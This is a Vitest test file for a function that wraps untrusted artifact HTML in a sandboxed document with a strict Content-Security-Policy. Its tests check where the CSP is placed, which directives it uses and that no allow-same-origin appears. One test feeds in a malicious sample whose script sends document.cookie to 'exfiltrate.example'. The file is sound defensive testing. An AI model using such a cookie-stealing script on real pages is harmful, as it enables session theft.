import { describe, expect, it } from "vitest";
import { ARTIFACT_CSP, buildSandboxedSrcDoc } from "./sandboxHtml";

describe("buildSandboxedSrcDoc (AC8 / ADR-004)", () => {
  it("places the exact CSP meta tag as the first content of <head>, before any artifact content", () => {
    const doc = buildSandboxedSrcDoc("<p>hello</p>");
    const headIdx = doc.indexOf("<head>");
    const cspIdx = doc.indexOf('<meta http-equiv="Content-Security-Policy"');
    const contentIdx = doc.indexOf("<p>hello</p>");

    expect(headIdx).toBeGreaterThanOrEqual(0);
    expect(cspIdx).toBeGreaterThan(headIdx);
    expect(contentIdx).toBeGreaterThan(cspIdx);
    // only the page charset meta may precede the CSP meta
    const between = doc.slice(headIdx, cspIdx);
    expect(between).not.toMatch(/<(script|style|link|img)/i);
  });

  it("uses the exact CSP directives from architecture.md §10 / ADR-004", () => {
    expect(ARTIFACT_CSP).toBe(
      "default-src 'none'; style-src 'unsafe-inline'; img-src data:; script-src 'unsafe-inline'",
    );
    const doc = buildSandboxedSrcDoc("<p>x</p>");
    expect(doc).toContain(`content="${ARTIFACT_CSP}"`);
  });

  it("does not itself introduce allow-same-origin anywhere in the produced document", () => {
    const doc = buildSandboxedSrcDoc("<script>fetch('https://example.com')</script>");
    expect(doc).not.toMatch(/allow-same-origin/);
  });

  it("still places the CSP before content that supplies its own <html>/<head>/<body> wrapper", () => {
    const maliciousDoc =
      "<!doctype html><html><head><meta http-equiv=\"Content-Security-Policy\" content=\"default-src *\">" +
      "</head><body><script>fetch('https://exfiltrate.example/'+document.cookie)</script></body></html>";
    const doc = buildSandboxedSrcDoc(maliciousDoc);
    const ourCspIdx = doc.indexOf(`content="${ARTIFACT_CSP}"`);
    const theirCspIdx = doc.indexOf('content="default-src *"');
    expect(ourCspIdx).toBeGreaterThanOrEqual(0);
    expect(ourCspIdx).toBeLessThan(theirCspIdx);
  });

  it("preserves the raw content verbatim in the body (no escaping/loss)", () => {
    const raw = "<div class=\"card\">Some <strong>content</strong> & an ampersand</div>";
    const doc = buildSandboxedSrcDoc(raw);
    expect(doc).toContain(raw);
  });
});
